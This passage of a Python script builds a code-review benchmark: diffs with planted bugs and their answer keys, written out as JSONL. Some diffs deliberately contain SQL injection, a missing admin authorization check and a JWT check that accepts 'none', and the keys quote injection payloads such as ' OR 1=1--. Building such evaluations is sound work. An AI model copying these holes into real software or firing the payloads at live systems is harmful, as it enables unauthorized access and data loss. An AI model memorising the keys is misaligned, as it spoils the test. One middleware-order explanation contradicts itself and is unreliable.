    "Fire-and-forget metrics emit goroutine",
    """diff --git a/internal/server/handler.go b/internal/server/handler.go
index 77aa..88bb 100644
--- a/internal/server/handler.go
+++ b/internal/server/handler.go
@@ -1,20 +1,28 @@
 package server

 import (
     "net/http"
     "time"

     "acme/internal/metrics"
 )

+func (s *Server) Handle(w http.ResponseWriter, r *http.Request) {
+    start := time.Now()
+    s.inner.ServeHTTP(w, r)
+    dur := time.Since(start)
+
+    // Fire-and-forget: metric emission must never block the response path
+    // and we explicitly do not care about its outcome. Loss on shutdown
+    // is acceptable per the metrics SLA.
+    go metrics.EmitRequestDuration(r.URL.Path, dur)
+}
""",
    [],
)

add(
    "cretu-047",
    "python",
    "clean",
    "Catch and re-raise to attach context",
    """diff --git a/services/payments/charge.py b/services/payments/charge.py
index 55cc..66dd 100644
--- a/services/payments/charge.py
+++ b/services/payments/charge.py
@@ -1,16 +1,24 @@
+class ChargeFailed(Exception):
+    def __init__(self, customer_id: str, cause: Exception):
+        super().__init__(f"charge failed for customer {customer_id}: {cause}")
+        self.customer_id = customer_id
+        self.cause = cause
+
+
+def charge(customer_id: str, amount_cents: int) -> str:
+    try:
+        return _gateway.charge(customer_id, amount_cents)
+    except Exception as exc:
+        raise ChargeFailed(customer_id, exc) from exc
""",
    [],
)


# ============================================================================
# Bonus: a couple of multi-bug examples to test prioritization.
# ============================================================================

add(
    "cretu-048",
    "python",
    "hard",
    "Add bulk email send endpoint (two issues)",
    """diff --git a/api/admin/bulk_email.py b/api/admin/bulk_email.py
new file mode 100644
index 0000000..1a2b3c4
--- /dev/null
+++ b/api/admin/bulk_email.py
@@ -0,0 +1,32 @@
+from fastapi import APIRouter
+from .db import db
+from .ses import send_email
+
+router = APIRouter()
+
+
+@router.post("/admin/bulk-email")
+def bulk_email(subject: str, body: str, segment: str):
+    rows = db.execute(
+        f"SELECT email, name FROM users WHERE segment = '{segment}'"
+    ).fetchall()
+
+    sent = 0
+    for row in rows:
+        personalized = body.replace("{name}", row["name"])
+        send_email(row["email"], subject, personalized)
+        sent += 1
+
+    return {"sent": sent}
""",
    [
        {
            "file": "api/admin/bulk_email.py",
            "line_start": 11,
            "line_end": 11,
            "category": "sql-injection",
            "severity": "critical",
            "description": (
                "The 'segment' query parameter is interpolated directly into the SQL "
                "string. Any caller (even an authenticated admin in a compromised "
                "session) can send segment=\"' OR 1=1--\" to enumerate every user, or "
                "'; DROP TABLE users; --' if multi-statement is enabled. Replace with "
                "parameterized execute() — 'WHERE segment = %s', (segment,)."
            ),
        },
        {
            "file": "api/admin/bulk_email.py",
            "line_start": 8,
            "line_end": 16,
            "category": "missing-authz",
            "severity": "critical",
            "description": (
                "The endpoint is mounted at /admin/bulk-email but has no auth dependency. "
                "Anyone who can reach the API can blast email to every user in a "
                "segment, which is both a spam vector and a phishing/typosquat risk. "
                "Add Depends(require_admin) (or whatever the project's admin guard is) "
                "to the route."
            ),
        },
    ],
)

add(
    "cretu-049",
    "typescript",
    "hard",
    "Add image upload component (two issues)",
    """diff --git a/src/components/AvatarUpload.tsx b/src/components/AvatarUpload.tsx
new file mode 100644
index 0000000..1a2b3c4
--- /dev/null
+++ b/src/components/AvatarUpload.tsx
@@ -0,0 +1,42 @@
+import { useState, useRef } from "react";
+import { uploadAvatar } from "../api/avatar";
+
+export function AvatarUpload({ onUploaded }: { onUploaded: (url: string) => void }) {
+  const [preview, setPreview] = useState<string | null>(null);
+  const inputRef = useRef<HTMLInputElement>(null);
+
+  function pick() {
+    inputRef.current?.click();
+  }
+
+  async function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
+    const file = e.target.files![0];
+    setPreview(URL.createObjectURL(file));
+    const { url } = await uploadAvatar(file);
+    onUploaded(url);
+  }
+
+  return (
+    <div>
+      <button onClick={pick}>Choose</button>
+      <input
+        ref={inputRef}
+        type="file"
+        accept="image/*"
+        onChange={handleChange}
+        style={{ display: "none" }}
+      />
+      {preview && <img src={preview} />}
+    </div>
+  );
+}
""",
    [
        {
            "file": "src/components/AvatarUpload.tsx",
            "line_start": 13,
            "line_end": 14,
            "category": "unchecked-array-access",
            "severity": "medium",
            "description": (
                "e.target.files![0] uses non-null assertion on .files and indexes [0] "
                "with no guard. If the user cancels the picker, .files is empty (length "
                "0), so file is undefined, URL.createObjectURL throws on undefined, and "
                "uploadAvatar receives undefined. Guard with 'if (!e.target.files?.length) "
                "return;' before reading [0]."
            ),
        },
        {
            "file": "src/components/AvatarUpload.tsx",
            "line_start": 13,
            "line_end": 16,
            "category": "objecturl-leak",
            "severity": "low",
            "description": (
                "URL.createObjectURL produces a blob: URL that the browser keeps alive "
                "until the page unloads OR URL.revokeObjectURL is called on it. The "
                "component creates a new one on every change and never revokes; long-lived "
                "pages (settings flows, multi-step uploads) accumulate blob memory. "
                "Revoke the previous preview before creating the next one, and revoke "
                "the current one in a useEffect cleanup."
            ),
        },
    ],
)

add(
    "cretu-050",
    "python",
    "hard",
    "Refactor: move token validation into middleware (two issues)",
    """diff --git a/api/middleware/auth.py b/api/middleware/auth.py
new file mode 100644
index 0000000..1a2b3c4
--- /dev/null
+++ b/api/middleware/auth.py
@@ -0,0 +1,28 @@
+import jwt
+from starlette.middleware.base import BaseHTTPMiddleware
+from starlette.responses import JSONResponse
+
+from .config import settings
+
+
+class AuthMiddleware(BaseHTTPMiddleware):
+    async def dispatch(self, request, call_next):
+        if request.url.path.startswith("/public"):
+            return await call_next(request)
+
+        header = request.headers.get("authorization", "")
+        token = header.removeprefix("Bearer ").strip()
+
+        try:
+            payload = jwt.decode(token, settings.jwt_secret, algorithms=["HS256", "none"])
+        except jwt.PyJWTError:
+            return JSONResponse({"error": "unauthorized"}, status_code=401)
+
+        request.state.user_id = payload["sub"]
+        return await call_next(request)
diff --git a/api/__init__.py b/api/__init__.py
index 33aa..44bb 100644
--- a/api/__init__.py
+++ b/api/__init__.py
@@ -1,12 +1,17 @@
 from fastapi import FastAPI
 from .routes import router
+from .middleware.auth import AuthMiddleware
+from .middleware.cors import cors_middleware

 app = FastAPI()
+app.include_router(router)
+app.middleware("http")(cors_middleware)
+app.add_middleware(AuthMiddleware)
""",
    [
        {
            "file": "api/middleware/auth.py",
            "line_start": 18,
            "line_end": 18,
            "category": "alg-none-bypass",
            "severity": "critical",
            "description": (
                "The algorithms list includes 'none' alongside HS256. An attacker can "
                "mint a token with alg=none, no signature, and arbitrary 'sub' claim — "
                "PyJWT will accept it because 'none' is in the allow-list. This is the "
                "canonical JWT bypass. Restrict algorithms=['HS256'] (no 'none', no "
                "asymmetric algs unless you want them) and reject tokens with an "
                "unexpected alg header."
            ),
        },
        {
            "file": "api/__init__.py",
            "line_start": 10,
            "line_end": 14,
            "category": "middleware-order",
            "severity": "high",
            "description": (
                "Starlette runs middleware in reverse-registration order on the request "
                "path: the last one added is the outermost. Here add_middleware(Auth) is "
                "called after middleware('http')(cors_middleware), which means Auth runs "
                "*before* CORS on the response side and after it on the request side — "
                "but importantly, OPTIONS preflight requests now hit Auth, which has no "
                "/public branch for them, and return 401. The browser then blocks every "
                "cross-origin request from a logged-out state. Register Auth before "
                "CORS, or explicitly skip CORS preflight (request.method == 'OPTIONS') "
                "in the auth middleware."
            ),
        },
    ],
)


# ============================================================================
# Write JSONL
# ============================================================================

if __name__ == "__main__":
    out_path = Path(__file__).parent / "cretu.txt"
    with open(out_path, "w") as f:
        for ex in EXAMPLES:
            f.write(json.dumps(ex, ensure_ascii=False) + "\n")

    # Quick summary
    from collections import Counter

    diffs = Counter(e["difficulty"] for e in EXAMPLES)
    langs = Counter(e["language"] for e in EXAMPLES)
    multi_file = sum(1 for e in EXAMPLES if e["diff"].count("diff --git") > 1)
    clean = sum(1 for e in EXAMPLES if not e["bugs"])
    multi_bug = sum(1 for e in EXAMPLES if len(e["bugs"]) > 1)

    print(f"Wrote {len(EXAMPLES)} examples to {out_path}")
    print(f"  difficulty: {dict(diffs)}")
    print(f"  language:   {dict(langs)}")
    print(f"  multi-file diffs: {multi_file}")
    print(f"  clean cases:      {clean}")
    print(f"  multi-bug cases:  {multi_bug}")
